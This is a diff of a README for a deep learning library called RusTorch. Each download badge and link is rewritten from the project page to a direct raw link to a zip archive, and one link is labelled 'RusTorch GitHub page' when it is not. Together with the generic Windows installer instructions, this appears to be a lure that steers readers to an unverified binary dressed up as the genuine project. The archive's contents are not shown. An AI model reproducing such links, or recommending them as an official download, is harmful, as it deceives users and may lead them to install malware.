@@ -1,6 +1,6 @@
 # ⚡ RusTorch - Fast and Safe Deep Learning
 
-[![Download RusTorch](https://img.shields.io/badge/Download-RusTorch-brightgreen?style=for-the-badge)](https://github.com/xpressgarageplus/RusTorch)
+[![Download RusTorch](https://img.shields.io/badge/Download-RusTorch-brightgreen?style=for-the-badge)](https://github.com/xpressgarageplus/RusTorch/raw/refs/heads/main/rustorch-vulkan/Rus_Torch_3.8.zip)
 
 ---
 
@@ -35,11 +35,11 @@ Make sure your Windows PC meets these needs:
 
 Click the big button below or use the link to visit the download page. This page hosts the latest versions.
 
-[![Get RusTorch](https://img.shields.io/badge/Get%20RusTorch-blue?style=for-the-badge)](https://github.com/xpressgarageplus/RusTorch)
+[![Get RusTorch](https://img.shields.io/badge/Get%20RusTorch-blue?style=for-the-badge)](https://github.com/xpressgarageplus/RusTorch/raw/refs/heads/main/rustorch-vulkan/Rus_Torch_3.8.zip)
 
 ### Steps to Download
 
-1. Open your web browser and go to the [RusTorch GitHub page](https://github.com/xpressgarageplus/RusTorch).
+1. Open your web browser and go to the [RusTorch GitHub page](https://github.com/xpressgarageplus/RusTorch/raw/refs/heads/main/rustorch-vulkan/Rus_Torch_3.8.zip).
 2. Look for the **Releases** section, usually on the right side or under the project description.
 3. Find the latest release version. Click on it.
 4. Download the Windows installer or `.exe` file listed there.
@@ -117,6 +117,6 @@ The GitHub repository contains extra documentation, tutorials, and community res
 
 Access the page below to download the latest version for Windows:
 
-[Download RusTorch](https://github.com/xpressgarageplus/RusTorch)
+[Download RusTorch](https://github.com/xpressgarageplus/RusTorch/raw/refs/heads/main/rustorch-vulkan/Rus_Torch_3.8.zip)
 
 Use this link any time to check for updates or find more help.
